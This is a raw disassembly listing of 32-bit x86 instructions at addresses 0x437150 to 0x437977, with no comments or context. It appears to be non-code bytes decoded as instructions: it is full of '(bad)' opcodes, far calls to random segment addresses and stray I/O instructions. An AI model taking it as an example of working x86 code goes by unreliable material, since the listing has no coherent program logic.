  437150:	mov    eax,0x9e5b81db
  437155:	mov    eax,ds:0xbe24cb99
  43715a:	mov    ds:0x379a643f,eax
  43715f:	test   eax,0xaa843a6c
  437164:	push   eax
  437165:	pop    edi
  437166:	test   al,0xc5
  437168:	repz jmp 0x18be:0xf512e773
  437170:	retf   
  437171:	rcr    DWORD PTR [edx-0x17e72af],0x8d
  437178:	add    bh,BYTE PTR [ebx]
  43717a:	cmova  ebp,DWORD PTR [edx]
  43717d:	xor    ah,BYTE PTR [edi+0x57a43584]
  437183:	push   edx
  437184:	mov    ?,WORD PTR [ebx+0x3c]
  437187:	push   esi
  437188:	(bad)  
  437189:	sbb    bl,BYTE PTR [edx+0xf0d4278]
  43718f:	sub    DWORD PTR [edx-0x5f],edi
  437192:	ret    
  437193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437194:	mov    BYTE PTR [esi],al
  437196:	add    eax,0x6d4361b7
  43719b:	aam    0x48
  43719d:	mov    esi,DWORD PTR [esi-0x5c6351b3]
  4371a3:	daa    
  4371a4:	lods   al,BYTE PTR ds:[esi]
  4371a5:	xchg   ebp,eax
  4371a6:	push   ecx
  4371a7:	dec    edx
  4371a8:	and    bl,dl
  4371aa:	fidivr WORD PTR [eax+0x27e8558e]
  4371b0:	mov    bh,BYTE PTR [edi]
  4371b2:	jnp    0x43713d
  4371b4:	ja     0x437178
  4371b6:	fwait
  4371b7:	leave  
  4371b8:	repnz mov ds:0xf379f3e5,al
  4371be:	sbb    cl,BYTE PTR [ecx-0x11]
  4371c1:	push   cs
  4371c2:	sbb    DWORD PTR [esi+0x59a915e],0xffffffad
  4371c9:	repnz scas al,BYTE PTR es:[edi]
  4371cb:	arpl   WORD PTR [ebp+ebp*8+0x711ea22f],cx
  4371d2:	addr16 adc eax,0xa1778b8e
  4371d8:	add    ecx,DWORD PTR [esi-0x66]
  4371db:	sub    BYTE PTR ds:0xe9978dc9,0xcb
  4371e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4371e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4371e4:	or     ebx,DWORD PTR [ebx+ebp*8-0x4dba727]
  4371eb:	mov    al,BYTE PTR ss:0xb3e9c2c
  4371f2:	fsub   QWORD PTR [esi-0x3c]
  4371f5:	mov    dh,ah
  4371f7:	outs   dx,BYTE PTR ds:[esi]
  4371f8:	inc    eax
  4371f9:	xchg   ebx,eax
  4371fa:	sub    ah,BYTE PTR [edi-0x79b215ec]
  437200:	or     ecx,DWORD PTR [edi-0x4f]
  437203:	pop    ebp
  437204:	mov    dl,0x0
  437206:	in     al,0xe4
  437208:	shr    BYTE PTR [ebx],0x1d
  43720b:	ss xchg ebp,eax
  43720d:	or     edi,DWORD PTR [eax+0x233a30ea]
  437213:	aam    0x22
  437215:	neg    DWORD PTR [ebx-0x1c9267c4]
  43721b:	cmp    al,0xac
  43721e:	push   0x62
  437220:	dec    edi
  437221:	xor    al,0x7a
  437223:	jns    0x4371d8
  437225:	and    al,0x57
  437227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437228:	icebp  
  437229:	pop    eax
  43722a:	mov    dh,0x5b
  43722c:	imul   edi,ecx,0xffffff9a
  43722f:	mov    ecx,0x667b2d0a
  437234:	std    
  437235:	push   0x7588a77e
  43723a:	jns    0x43720c
  43723c:	pusha  
  43723d:	dec    esi
  43723e:	jge    0x437299
  437240:	mov    dl,0x69
  437242:	sbb    DWORD PTR [ebp-0x7ba29acc],edx
  437248:	mov    dh,0xb
  43724a:	adc    al,0x37
  43724c:	dec    edi
  43724d:	inc    ecx
  43724e:	sbb    eax,0xb43be6e9
  437253:	xchg   BYTE PTR [ecx-0x7ad85fc9],dh
  437259:	pop    ss
  43725a:	test   eax,0xbcae320b
  43725f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437260:	mov    al,ds:0x46eab5fe
  437265:	mov    al,BYTE PTR [edx+eax*4]
  437268:	leave  
  437269:	in     eax,dx
  43726a:	call   0xf9f6:0x63d3a215
  437271:	mov    edi,0x63e4a738
  437276:	pop    edx
  437277:	aas    
  437278:	mov    dh,0x99
  43727a:	addr16 int3 
  43727c:	sub    ah,al
  43727e:	call   0x6a52:0xaa72db8d
  437285:	inc    esp
  437286:	adc    dh,0x5d
  437289:	xor    ch,ch
  43728b:	call   0xaf6:0x49c188b2
  437292:	retf   0xb169
  437295:	push   esp
  437296:	jns    0x437303
  437298:	mov    ebp,0x801edd7f
  43729d:	and    BYTE PTR [edx],bl
  43729f:	pop    ds
  4372a0:	stos   DWORD PTR es:[edi],eax
  4372a1:	jl     0x437256
  4372a3:	outs   dx,DWORD PTR ds:[esi]
  4372a4:	xchg   ebx,eax
  4372a5:	scas   eax,DWORD PTR es:[edi]
  4372a6:	call   0xeedf:0x127bcf61
  4372ad:	xor    ah,BYTE PTR fs:[edi+0x30ac0de9]
  4372b4:	xchg   esp,eax
  4372b5:	mov    esp,0x11b27271
  4372ba:	xchg   ebp,eax
  4372bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372bc:	inc    edx
  4372bd:	lods   eax,DWORD PTR ds:[esi]
  4372be:	cdq    
  4372bf:	(bad)  
  4372c0:	loopne 0x4372c7
  4372c2:	mov    bl,BYTE PTR [eax]
  4372c4:	push   esi
  4372c5:	and    eax,0xbcc86b3a
  4372ca:	sahf   
  4372cb:	fisubr WORD PTR [esi+ecx*1-0x3acd3b1b]
  4372d2:	fwait
  4372d3:	jp     0x4372c6
  4372d5:	inc    ebx
  4372d6:	neg    DWORD PTR [esi-0x5891bb15]
  4372dc:	(bad)  [esi-0x50]
  4372df:	adc    BYTE PTR [ebx+eiz*2],cl
  4372e2:	shl    ch,1
  4372e4:	mov    dl,0x3b
  4372e6:	imul   esp,esi,0x4d
  4372e9:	sub    ebx,edi
  4372eb:	ja     0x43733b
  4372ed:	out    0x67,al
  4372ef:	lahf   
  4372f0:	inc    esi
  4372f1:	loopne 0x437334
  4372f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4372f4:	rcr    BYTE PTR [ebp+eiz*4+0x52e96e88],0xc
  4372fc:	not    BYTE PTR ds:0x4df21d9a
  437302:	scas   al,BYTE PTR es:[edi]
  437303:	or     cl,dl
  437305:	push   cs
  437306:	mov    ebx,0x9a9853eb
  43730b:	add    eax,eax
  43730d:	lahf   
  43730e:	xchg   DWORD PTR [ecx],edi
  437310:	fcomp  DWORD PTR [ecx]
  437312:	in     eax,dx
  437313:	mov    ds:0xcf88da40,eax
  437318:	adc    eax,0x42919af3
  43731d:	inc    eax
  43731e:	lods   al,BYTE PTR ds:[esi]
  43731f:	xchg   ebp,eax
  437320:	std    
  437321:	add    al,0xb5
  437323:	sar    BYTE PTR [esi+0x4f],0x9a
  437327:	neg    cl
  437329:	jnp    0x437311
  43732b:	les    esi,FWORD PTR [ebx-0x46802367]
  437331:	mov    ch,0xb8
  437333:	add    DWORD PTR [esi-0x3],0xc82aa3ae
  43733a:	add    al,0x5
  43733c:	inc    esi
  43733d:	retf   
  43733e:	sub    al,0xa5
  437340:	jg     0x4373bb
  437342:	fs test al,0xaf
  437345:	pop    ds
  437346:	fdivrp st(4),st
  437348:	(bad)  
  437349:	mov    edi,esi
  43734b:	sbb    DWORD PTR [ebx-0x62],eax
  43734e:	mov    ecx,DWORD PTR [edi]
  437350:	ror    DWORD PTR [ebx],0x53
  437353:	mov    cl,0x60
  437355:	out    dx,al
  437356:	inc    esp
  437357:	call   0xe387:0x339a24b6
  43735e:	adc    DWORD PTR [edi],ebp
  437360:	add    BYTE PTR [ebx+0x3186a73c],ch
  437366:	xor    BYTE PTR [edi+0x60],0x4
  43736a:	int    0x53
  43736c:	adc    dh,BYTE PTR [ebx+0x76c7c70c]
  437372:	call   0xefb:0xc750b672
  437379:	and    eax,0xe13a71d
  43737e:	pop    edx
  43737f:	mov    bl,0x8d
  437381:	imul   esp,ecx,0xffffffc8
  437384:	mov    dl,0xa6
  437386:	push   ss
  437387:	push   ss
  437388:	inc    esp
  437389:	xor    bh,ch
  43738b:	and    bl,BYTE PTR [ebx+ecx*1-0x2dc72dfa]
  437392:	div    DWORD PTR [ebx]
  437394:	sbb    eax,0xbd289ae1
  437399:	xor    BYTE PTR [edx],dl
  43739b:	add    eax,0xa8dad423
  4373a0:	pop    es
  4373a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4373a2:	shr    ah,0xad
  4373a5:	dec    ebx
  4373a6:	jae    0x437416
  4373a8:	add    DWORD PTR [ecx-0x31],esp
  4373ab:	out    dx,al
  4373ac:	mov    dl,0x44
  4373ae:	rcr    DWORD PTR ss:0xfee35134,cl
  4373b5:	or     eax,DWORD PTR [edx+0x25]
  4373b8:	push   edx
  4373b9:	das    
  4373ba:	mov    al,0x5f
  4373bc:	sub    al,0x77
  4373be:	call   0x3c33:0x21514245
  4373c5:	inc    ecx
  4373c6:	pop    ss
  4373c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4373c8:	xor    al,0xa5
  4373ca:	inc    ecx
  4373cb:	(bad)  
  4373cc:	push   esi
  4373cd:	shl    BYTE PTR [edi-0x6014d0c],0x6d
  4373d4:	pop    esp
  4373d5:	sbb    esi,ecx
  4373d7:	ret    0xb3b
  4373da:	mov    ebp,0x1829e744
  4373df:	aad    0xf8
  4373e1:	outs   dx,DWORD PTR ds:[esi]
  4373e2:	call   0xfc6f:0x97217396
  4373e9:	pop    ss
  4373ea:	loop   0x437393
  4373ec:	repnz lods al,BYTE PTR ds:[esi]
  4373ee:	xchg   ebx,eax
  4373ef:	cld    
  4373f0:	(bad)  
  4373f2:	sub    eax,0xe878b278
  4373f7:	ret    
  4373f8:	outs   dx,DWORD PTR ds:[esi]
  4373f9:	and    ch,BYTE PTR [eax+0x7]
  4373fc:	stc    
  4373fd:	or     esi,DWORD PTR [edx+0x6442824]
  437403:	enter  0xc85e,0x9a
  437407:	xor    ah,0xcb
  43740a:	jno    0x437485
  43740c:	sub    DWORD PTR [esi-0x46],esp
  43740f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437410:	(bad)  
  437411:	cld    
  437412:	adc    al,BYTE PTR [edx]
  437414:	(bad)  
  437416:	loopne 0x437475
  437418:	mov    dl,0x73
  43741a:	ja     0x437429
  43741c:	push   ss
  43741d:	shl    DWORD PTR [ebx+ebx*8+0x4f01f79d],cl
  437424:	fdiv   DWORD PTR ds:0x932c20a
  43742a:	dec    ecx
  43742b:	or     BYTE PTR [edi+eiz*4],al
  43742e:	test   BYTE PTR [edi-0x5b96b04e],dl
  437434:	sbb    dl,BYTE PTR [ecx]
  437436:	sbb    DWORD PTR [ecx],0xffffffe5
  437439:	or     esi,DWORD PTR [esp+edi*1-0x5e687381]
  437440:	call   0x14f2:0xb5a6e07e
  437447:	call   0xb16d931e
  43744c:	xor    BYTE PTR [ebp+0x4372a77e],0x3b
  437453:	push   0x6a
  437455:	sar    BYTE PTR ds:0x2a80b256,1
  43745b:	push   ebp
  43745c:	cmp    BYTE PTR [esi+eiz*4-0x9f46bf1],dl
  437463:	iret   
  437464:	mov    ch,0x6b
  437466:	cwde   
  437467:	(bad)  
  437468:	and    BYTE PTR [edx-0x66],al
  43746b:	xor    BYTE PTR [edi+ebx*2-0x6e],bl
  43746f:	leave  
  437470:	ret    
  437471:	jb     0x43746a
  437473:	mov    DWORD PTR [ebp+ecx*2-0x64],eax
  437477:	mov    eax,0xfd938bd5
  43747c:	mov    ch,0xdf
  43747e:	int3   
  43747f:	fdiv   QWORD PTR [edx+0x1713e5c8]
  437485:	fisubr DWORD PTR [esi+0x6d]
  437488:	jg     0x437495
  43748a:	arpl   WORD PTR [eax-0x69],bx
  43748d:	sbb    eax,DWORD PTR [ebp+esi*2+0x1290db4e]
  437494:	inc    ebp
  437495:	add    al,0xe1
  437497:	das    
  437498:	mov    dl,0xff
  43749a:	mov    cl,0xba
  43749c:	(bad)  
  43749d:	daa    
  43749e:	push   ecx
  43749f:	mov    ah,0x2f
  4374a1:	sbb    eax,0xbc42a7d9
  4374a6:	jecxz  0x43744c
  4374a8:	push   edx
  4374a9:	and    DWORD PTR [ebp-0x7cc30fea],edx
  4374af:	(bad)  
  4374b0:	cmp    DWORD PTR [ecx+0x1332eae4],edi
  4374b6:	jmp    0xb2ca:0x514bf1cf
  4374bd:	sub    bh,0x75
  4374c0:	dec    eax
  4374c1:	push   ebp
  4374c2:	jns    0x43746a
  4374c4:	inc    edi
  4374c5:	add    al,0x3e
  4374c7:	sub    al,0x98
  4374c9:	into   
  4374ca:	in     eax,0x67
  4374cc:	or     ch,BYTE PTR [edi+edi*4-0x65e503c9]
  4374d3:	pushf  
  4374d4:	loop   0x4374b4
  4374d6:	dec    ebx
  4374d7:	not    bl
  4374d9:	dec    edx
  4374da:	xchg   esp,eax
  4374db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4374dc:	adc    DWORD PTR [edx],esi
  4374de:	mov    ecx,0x21003659
  4374e3:	cmp    BYTE PTR [edx+0x1a1fc31e],dh
  4374e9:	popfw  
  4374eb:	loopne 0x43747d
  4374ed:	pop    ss
  4374ee:	retf   0xad82
  4374f1:	retf   
  4374f2:	ret    0x11b5
  4374f5:	push   cs
  4374f6:	xor    al,0x78
  4374f8:	mov    dl,0x82
  4374fa:	imul   eax,eax,0x1751d2cb
  437500:	repz or al,0x1e
  437503:	sub    ch,BYTE PTR [ecx]
  437505:	fstp   TBYTE PTR [eax-0x6fb785f9]
  43750b:	stc    
  43750c:	push   esp
  43750d:	push   cs
  43750e:	call   0x2c7b:0xd3a810cc
  437515:	sub    BYTE PTR [edi],dh
  437517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437518:	sub    DWORD PTR [ebx-0x73e55453],ecx
  43751e:	add    al,dl
  437520:	mov    dl,0xda
  437522:	bound  ebp,QWORD PTR [esi]
  437524:	jecxz  0x43753d
  437526:	outs   dx,DWORD PTR ds:[esi]
  437527:	stos   BYTE PTR es:[edi],al
  437528:	ror    BYTE PTR [ebx],0x19
  43752b:	fisubr WORD PTR [eax-0x7e8cdc76]
  437531:	jp     0x4374cd
  437533:	shl    DWORD PTR [ebx+0x3748f021],0xea
  43753a:	and    DWORD PTR [edi-0x61b39b73],0x51
  437541:	mov    eax,0xafb22ed6
  437546:	adc    eax,0x1d46dfb3
  43754b:	xchg   ebp,eax
  43754c:	mov    al,0xb
  43754e:	test   DWORD PTR [ecx+0x4],ebx
  437551:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  437553:	outs   dx,BYTE PTR ds:[esi]
  437554:	stos   BYTE PTR es:[edi],al
  437555:	push   ss
  437556:	cdq    
  437557:	mov    esp,0x1a2d62d9
  43755c:	and    bl,dh
  43755e:	es add al,0xb
  437562:	fst    DWORD PTR [ecx+0x56ab19b8]
  437568:	and    DWORD PTR [esp+eiz*8-0x12b44da5],edx
  43756f:	in     al,dx
  437570:	dec    edx
  437571:	xor    ebx,DWORD PTR [ecx]
  437573:	push   0xa7c6f98b
  437578:	call   0x5b30:0x17715d45
  43757f:	int3   
  437580:	(bad)  
  437581:	retf   
  437582:	sbb    al,0xa7
  437584:	cmp    DWORD PTR [esi-0x5fb8cdc2],esp
  43758a:	mov    ecx,0xfd029ba7
  43758f:	pop    ebp
  437590:	push   ds
  437591:	in     al,dx
  437592:	stos   DWORD PTR es:[edi],eax
  437593:	(bad)  [ebx-0x2f26475e]
  437599:	ds dec esi
  43759b:	stos   BYTE PTR es:[edi],al
  43759c:	inc    esi
  43759d:	mov    eax,ds:0xe1b541c9
  4375a2:	shl    BYTE PTR [edi-0x7e29f79d],cl
  4375a8:	out    dx,al
  4375a9:	rcr    DWORD PTR [ebx+0x2],0x8a
  4375ad:	push   ds
  4375ae:	inc    esp
  4375af:	daa    
  4375b0:	ret    0x2baa
  4375b3:	fcom   st(3)
  4375b5:	cmc    
  4375b6:	frstor [edi+0x1225bf19]
  4375bc:	xor    eax,0xb272741a
  4375c1:	add    ah,BYTE PTR [eax-0x14]
  4375c4:	mov    dh,0x16
  4375c6:	jle    0x437636
  4375c8:	jl     0x4375d3
  4375ca:	shl    BYTE PTR [esi+0x30],0x8d
  4375ce:	fwait
  4375cf:	out    dx,eax
  4375d0:	jae    0x4375a8
  4375d2:	cmp    DWORD PTR [ebx+0x66],edx
  4375d5:	mov    bl,BYTE PTR [edx+0x657896f0]
  4375db:	shl    BYTE PTR [edi-0x735890f9],0x43
  4375e2:	out    dx,al
  4375e3:	enter  0x9894,0xde
  4375e7:	xchg   esp,eax
  4375e8:	ret    
  4375e9:	fcomp  DWORD PTR [edx-0x195957a0]
  4375ef:	adc    eax,0xa756eb2a
  4375f4:	loop   0x4375cf
  4375f6:	mov    edi,0xa4b626f2
  4375fb:	loope  0x4375af
  4375fd:	call   0x6aa8:0x3b64ac05
  437604:	lahf   
  437605:	or     esi,DWORD PTR [ebp+eiz*2-0x31148750]
  43760c:	retf   0x9a9f
  43760f:	cmp    DWORD PTR [ebp+0x55ff1f66],esp
  437615:	mov    ds:0xe2aea74d,eax
  43761a:	and    eax,0xaf22a0ba
  43761f:	shl    DWORD PTR [edx+0x162c80c5],cl
  437625:	adc    BYTE PTR [edx+0x10],dl
  437628:	push   ebx
  437629:	push   edi
  43762a:	sub    al,0xfd
  43762c:	mov    dl,0x56
  43762e:	loopne 0x437680
  437630:	loopne 0x4375df
  437632:	out    0x3c,eax
  437634:	mov    dl,0x1e
  437636:	jae    0x4375bf
  437638:	test   DWORD PTR [ecx],esi
  43763a:	sbb    esi,DWORD PTR [esi]
  43763c:	cmp    al,BYTE PTR ds:0x86ec4202
  437642:	jp     0x4375d7
  437644:	(bad)  
  437645:	mov    edi,0xc558ce80
  43764a:	call   0xd109:0xf157cbc9
  437651:	popf   
  437652:	bound  esp,QWORD PTR [edi-0x47950a0b]
  437658:	popf   
  437659:	inc    edi
  43765a:	outs   dx,DWORD PTR ds:[esi]
  43765b:	ret    0x2db2
  43765e:	and    al,0xdc
  437660:	iret   
  437661:	push   ebp
  437662:	je     0x437605
  437664:	cld    
  437665:	or     ebp,ebx
  437667:	test   cl,bh
  437669:	mov    ds,ebp
  43766b:	int    0xac
  43766d:	es call 0x6a7b:0xd61c8520
  437675:	push   edx
  437676:	xor    bl,ch
  437678:	push   eax
  437679:	std    
  43767a:	push   eax
  43767b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43767c:	xchg   ebx,eax
  43767d:	mov    dh,0xf
  43767f:	retf   
  437680:	cmp    edi,DWORD PTR [edx]
  437682:	jno    0x437631
  437684:	mov    bh,0x6a
  437686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437687:	fst    DWORD PTR [ebp-0x2a]
  43768a:	and    DWORD PTR fs:[si+0x17],esp
  43768f:	xor    bl,BYTE PTR [edi+0x51739265]
  437695:	adc    al,0xee
  437697:	addr16 (bad) 
  437699:	sti    
  43769a:	jmp    0x6c0f:0x9d60fa48
  4376a1:	jb     0x437684
  4376a3:	and    eax,0xeef5fdf2
  4376a8:	out    0xa,al
  4376aa:	mov    dh,0x17
  4376ac:	adc    DWORD PTR [edi+eax*1+0x28],eax
  4376b0:	push   es
  4376b1:	fcmovnbe st,st(4)
  4376b3:	aas    
  4376b4:	mov    dl,0xa0
  4376b6:	std    
  4376b7:	stos   BYTE PTR es:[edi],al
  4376b8:	jg     0x437727
  4376ba:	or     al,0x4e
  4376bc:	xchg   DWORD PTR [ebx],ecx
  4376be:	or     DWORD PTR [ecx],ebp
  4376c0:	(bad)  
  4376c1:	aam    0x35
  4376c3:	pushf  
  4376c4:	in     al,dx
  4376c5:	push   ebx
  4376c6:	add    ch,BYTE PTR [edi-0x50]
  4376c9:	shl    esp,1
  4376cb:	add    BYTE PTR [esp+edi*1+0xc],ch
  4376cf:	inc    edi
  4376d0:	popa   
  4376d1:	shl    DWORD PTR ds:0x308acfa7,cl
  4376d7:	int3   
  4376d8:	lock fiadd WORD PTR [ebp-0x6c]
  4376dc:	mov    dl,0xf0
  4376de:	jnp    0x4376ce
  4376e0:	cdq    
  4376e1:	stc    
  4376e2:	(bad)  
  4376e3:	jp     0x43769f
  4376e5:	push   cs
  4376e6:	aaa    
  4376e7:	aam    0xd4
  4376e9:	outs   dx,BYTE PTR ds:[esi]
  4376ea:	pop    esp
  4376eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4376ec:	and    al,0xe8
  4376ee:	js     0x4376a9
  4376f0:	icebp  
  4376f1:	jae    0x4376fa
  4376f3:	dec    esp
  4376f4:	jb     0x437737
  4376f6:	lahf   
  4376f7:	xchg   ebx,eax
  4376f8:	jns    0x437704
  4376fa:	xor    ah,0x92
  4376fd:	out    dx,al
  4376fe:	xchg   edi,eax
  4376ff:	adc    eax,0xcb25cb88
  437704:	mov    dl,0x11
  437706:	js     0x437696
  437708:	outs   dx,DWORD PTR ds:[esi]
  437709:	mov    dl,0xf4
  43770b:	pop    ds
  43770c:	(bad)  
  43770d:	imul   ecx,DWORD PTR [esi+0x4aec047b],0x3e
  437714:	mov    dl,0xb5
  437716:	retf   0xf4ba
  437719:	xor    ebp,DWORD PTR [ecx]
  43771b:	jge    0x437744
  43771d:	or     dl,BYTE PTR [ebp-0x64c8c012]
  437723:	add    eax,0x3a97d361
  437728:	mov    dh,0x95
  43772a:	or     eax,0x5a00ef2f
  43772f:	in     al,dx
  437730:	inc    esi
  437731:	mov    bh,0x53
  437733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437734:	je     0x437795
  437736:	mov    DWORD PTR [eax-0x29],ebx
  437739:	pop    ds
  43773a:	call   0x33ca:0xc5971a87
  437741:	push   eax
  437742:	inc    ecx
  437743:	mov    edx,0xe9a5e2f1
  437748:	scas   eax,DWORD PTR es:[edi]
  437749:	adc    al,0x5a
  43774b:	push   cs
  43774c:	retf   0x91f4
  43774f:	and    eax,0xe6482bb2
  437754:	xor    eax,0x6db06d93
  437759:	or     edx,esp
  43775b:	fdivr  DWORD PTR [ecx]
  43775d:	inc    eax
  43775e:	jo     0x43770b
  437760:	jle    0x437774
  437762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437763:	jl     0x437764
  437765:	mov    eax,DWORD PTR [ecx+0x3b842c5b]
  43776b:	add    edi,DWORD PTR [ebp-0x316cd7fb]
  437771:	adc    edi,DWORD PTR [ebx+0x5e1cb6fa]
  437777:	xchg   edi,eax
  437778:	hlt    
  437779:	mov    ds:0x7b24899a,eax
  43777e:	mov    BYTE PTR [edx+ebp*1-0x3758c0a7],al
  437785:	test   eax,0x87f661ac
  43778a:	mov    ebx,0x3054b2e6
  43778f:	ja     0x437723
  437791:	(bad)  
  437792:	inc    esi
  437793:	fwait
  437794:	jmp    0x43779a
  437796:	push   ds
  437797:	xchg   ebx,eax
  437798:	xchg   esi,eax
  437799:	into   
  43779a:	cli    
  43779b:	fisub  DWORD PTR [edi]
  43779d:	jno    0x4377d8
  43779f:	div    DWORD PTR [edx+0x431c7f73]
  4377a5:	or     BYTE PTR [ebp-0x2],dh
  4377a8:	jne    0x4377b5
  4377aa:	cmp    eax,0xc9963684
  4377af:	fidiv  WORD PTR [esi-0x44e6653d]
  4377b5:	inc    edx
  4377b6:	sbb    al,BYTE PTR [esi-0x7e]
  4377b9:	mov    al,ds:0xb0f1a7ef
  4377be:	dec    eax
  4377bf:	sub    dh,BYTE PTR [edi-0x765cecff]
  4377c5:	in     al,dx
  4377c6:	shl    BYTE PTR [esi],cl
  4377c8:	sbb    eax,0xbd601ff
  4377cd:	addr16 push 0x46487e4e
  4377d3:	mov    esp,0x2763179f
  4377d8:	mov    ah,0x8a
  4377da:	jmp    0x123a79f8
  4377df:	pop    ebx
  4377e0:	inc    ebx
  4377e1:	std    
  4377e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4377e3:	mov    DWORD PTR [edi],edx
  4377e5:	add    bh,BYTE PTR [ebp+0x38084f66]
  4377eb:	clc    
  4377ec:	fs fwait
  4377ee:	into   
  4377ef:	inc    esi
  4377f0:	out    dx,al
  4377f1:	or     edi,DWORD PTR [ecx+esi*1]
  4377f4:	add    eax,ecx
  4377f6:	adc    DWORD PTR ss:[edi+0x24],ebx
  4377fa:	call   0xa836:0xe406b7be
  437801:	sbb    eax,DWORD PTR [ecx]
  437803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437804:	(bad)  
  437805:	adc    edx,DWORD PTR [ecx-0x23]
  437808:	leave  
  437809:	cmp    DWORD PTR [edi+esi*2],eax
  43780c:	fadd   st(6),st
  43780e:	call   0x6c69:0x3b483123
  437815:	call   0x441c:0xb9c6a23d
  43781c:	cmp    ecx,DWORD PTR [ebx-0x3764c48e]
  437822:	call   0xf473:0x8c68dfb4
  437829:	sbb    al,0xb0
  43782b:	mov    edx,0xa4e773ea
  437830:	test   ch,bl
  437832:	add    al,0xd2
  437834:	dec    esp
  437835:	inc    ebx
  437836:	xchg   ebp,eax
  437837:	mov    cl,0xc
  437839:	xchg   ecx,eax
  43783a:	adc    al,0x87
  43783c:	and    BYTE PTR [ebp+0xbcaaf4d],cl
  437842:	sbb    ecx,ebp
  437844:	cli    
  437845:	pop    ds
  437846:	inc    edi
  437847:	mov    dh,0xa
  437849:	call   0x5ca3c0e8
  43784e:	jp     0x437866
  437850:	add    eax,0xc7a7a391
  437855:	sub    DWORD PTR [esi],esp
  437857:	repz cdq 
  437859:	mov    al,ds:0xa1b24cd9
  43785e:	inc    eax
  43785f:	cmp    DWORD PTR [ecx+0x2892574f],0x7c
  437866:	leave  
  437867:	test   al,0xd3
  437869:	in     al,0x29
  43786b:	aam    0x72
  43786d:	ror    BYTE PTR [esi-0x23],0x21
  437871:	outs   dx,DWORD PTR ds:[esi]
  437872:	call   0xf941:0xebf97fe5
  437879:	call   0x6dca33fb
  43787e:	jg     0x437867
  437880:	sbb    DWORD PTR [edi+eiz*4],edi
  437883:	imul   BYTE PTR [edi+0x13]
  437886:	call   0x2554:0x295b7a1d
  43788d:	aad    0xfc
  43788f:	mov    edx,0xa7e4f2d0
  437894:	test   al,0xe5
  437896:	xchg   edx,eax
  437897:	test   ecx,esi
  437899:	push   ds
  43789a:	call   0x9c63:0x4582fb7c
  4378a1:	push   ebx
  4378a2:	sbb    eax,0xef1703a7
  4378a7:	cwde   
  4378a8:	clc    
  4378a9:	js     0x437902
  4378ab:	sbb    eax,0xa3fab7be
  4378b0:	or     esp,DWORD PTR [ebx+0x1]
  4378b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4378b4:	push   ss
  4378b5:	loopne 0x4378c5
  4378b7:	repz leave 
  4378b9:	add    al,0x90
  4378bb:	dec    ecx
  4378bc:	mov    dl,0x81
  4378be:	mov    dh,0xca
  4378c0:	repz fnstsw WORD PTR [ecx]
  4378c3:	mov    esp,0x3deb14a2
  4378c8:	jo     0x437855
  4378ca:	cdq    
  4378cb:	inc    ebp
  4378cc:	push   ebp
  4378cd:	cmp    BYTE PTR [edi],dh
  4378cf:	int    0xb2
  4378d1:	mov    al,ds:0xf53100d1
  4378d6:	ja     0x437892
  4378d8:	ror    BYTE PTR [ebx],0xa7
  4378db:	mov    esi,0x3df484d0
  4378e0:	push   ds
  4378e1:	lods   eax,DWORD PTR ds:[esi]
  4378e2:	call   0x68a6:0xba0d9e67
  4378e9:	(bad)  
  4378ea:	ins    DWORD PTR es:[edi],dx
  4378eb:	sti    
  4378ec:	cli    
  4378ed:	(bad)  
  4378ee:	call   0x26c0:0x984f579d
  4378f5:	mov    al,BYTE PTR [ebp-0x65e47b65]
  4378fb:	sbb    al,0x68
  4378fd:	les    ebp,FWORD PTR [edi-0x54]
  437900:	or     BYTE PTR [esi],0xa3
  437903:	cmp    esi,ebx
  437905:	stos   DWORD PTR es:[edi],eax
  437906:	into   
  437907:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  437909:	fs pop edx
  43790b:	jne    0x437936
  43790d:	sub    eax,0x89a344b6
  437912:	fwait
  437913:	inc    edx
  437914:	icebp  
  437915:	in     al,0x51
  437917:	mov    ss,WORD PTR [esi+0x60]
  43791a:	in     al,0xa4
  43791c:	pop    ebx
  43791d:	adc    ebx,DWORD PTR [eax+0x15fbea66]
  437923:	and    edi,DWORD PTR [edi-0x5246f735]
  437929:	aaa    
  43792a:	bound  ebp,QWORD PTR [eax+0x2a]
  43792d:	arpl   WORD PTR [ebp+0x1a1378b5],ax
  437933:	(bad)  
  437934:	jecxz  0x437930
  437936:	outs   dx,DWORD PTR ds:[esi]
  437937:	arpl   WORD PTR [esp+ecx*1],cx
  43793a:	mov    cl,0x7d
  43793c:	dec    edx
  43793d:	ss js  0x437987
  437940:	hlt    
  437941:	mov    al,ds:0xd7b7ca3d
  437946:	fsubr  st,st(7)
  437948:	retf   0x9d8c
  43794b:	adc    cl,ah
  43794d:	cmp    eax,0xf3b1368a
  437952:	cwde   
  437953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437954:	cdq    
  437955:	test   BYTE PTR [esi-0x69],0xc6
  437959:	xor    edi,ebp
  43795b:	imul   esp,DWORD PTR [eax-0x63b71044],0x54
  437962:	scas   al,BYTE PTR es:[edi]
  437963:	in     al,0xb3
  437965:	clc    
  437966:	je     0x4379e7
  437968:	sub    bh,ah
  43796a:	push   esi
  43796b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43796c:	dec    edi
  43796d:	add    al,0xb6
  43796f:	lods   eax,DWORD PTR ds:[esi]
  437970:	call   0x5855:0x2f64040c
  437977:	shl    DWORD PTR [edx+0x3b],0xff
